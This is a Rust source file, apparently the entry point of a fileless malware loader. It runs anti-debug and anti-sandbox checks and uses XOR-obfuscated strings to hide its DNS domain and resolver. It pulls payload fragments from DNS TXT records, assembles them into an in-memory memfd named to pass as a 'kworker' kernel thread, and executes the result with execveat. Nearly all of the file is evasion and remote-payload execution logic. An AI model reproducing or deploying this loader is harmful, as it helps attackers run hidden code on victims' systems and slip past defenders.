mod syscalls;
mod fragments;
mod splicer;
mod membrane;
mod ribosome;
mod network_t_rna;
mod evasion;
#[macro_use]
mod obfuscator;

use fragments::FragmentSource;
use splicer::Splicer;
use membrane::Membrane;
use ribosome::Ribosome;
use network_t_rna::DnsTxtSource;
use evasion::Evasion;

fn main() {
    // === Phase 0: Elite Evasion (Anti-Debug, Anti-Sandbox) ===
    eprintln!("[*] Initializing Evasion modules...");
    if let Err(e) = Evasion::verify_environment() {
        eprintln!("[!] Evasion Triggered: {}", e);
        // In a real staging environment, we would exit cleanly or spin to waste time.
        // For lab verification, we print and exit.
        std::process::exit(1);
    }
    eprintln!("[+] Environment pristine. Proceeding.");

    // === Phase 1: tRNA delivery — collect fragments via DNS TXT ===
    eprintln!("[*] Fetching payload fragments via DNS TXT (Port 53 UDP)...");
    
    // Obfuscate the domain and the DNS raw resolver socket
    // payload.test.local -> len 18
    const DOMAIN: crate::obfuscator::ObfuscatedString<18> = obf!(b"payload.test.local", 0x3C);
    // 8.8.8.8:53 -> len 10
    const RESOLVER: crate::obfuscator::ObfuscatedString<10> = obf!(b"8.8.8.8:53", 0x51);

    let mut domain_clear = DOMAIN.decrypt();
    let mut resolver_clear = RESOLVER.decrypt();

    let dns_source = DnsTxtSource::new(
        std::str::from_utf8(&domain_clear).unwrap(),
        std::str::from_utf8(&resolver_clear).unwrap()
    );
    let mut frags = vec![dns_source.fetch()];

    // Scrub cleartext network indicators from memory immediately
    crate::syscalls::secure_zero(&mut domain_clear);
    crate::syscalls::secure_zero(&mut resolver_clear);

    // === Phase 2: Spliceosome — sort, validate, concatenate ===
    let mut payload = match Splicer::assemble(&mut frags) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[!] SpliceError: {}", e);
            std::process::exit(2);
        }
    };

    eprintln!("[*] Assembled {} bytes from {} fragments",
              payload.data.len(), payload.fragment_count);

    // === Phase 3: Membrane — create memfd, fill, zeroize source ===
    // Obfuscate 'kworker/u4:2\0' with XOR key 0x7A
    const VFS_NAME: crate::obfuscator::ObfuscatedString<13> = obf!(b"kworker/u4:2\0", 0x7A);
    let mut vfs_name_decrypted = VFS_NAME.decrypt();

    let fd = match Membrane::create_and_fill(&vfs_name_decrypted, &mut payload.data) {
        Ok(fd) => {
            eprintln!("[*] memfd created: fd={}", fd);
            crate::syscalls::secure_zero(&mut vfs_name_decrypted); // Scrub the cleartext immediately
            fd
        }
        Err(e) => {
            eprintln!("[!] MembraneError: {}", e);
            std::process::exit(3);
        }
    };

    // === Phase 4: Ribosome — execveat(AT_EMPTY_PATH) ===
    eprintln!("[*] Translating via execveat(AT_EMPTY_PATH)...");
    match Ribosome::translate(fd) {
        Ok(infallible) => match infallible {},
        Err(e) => {
            eprintln!("[!] TranslateError: {}", e);
            std::process::exit(4);
        }
    }
}
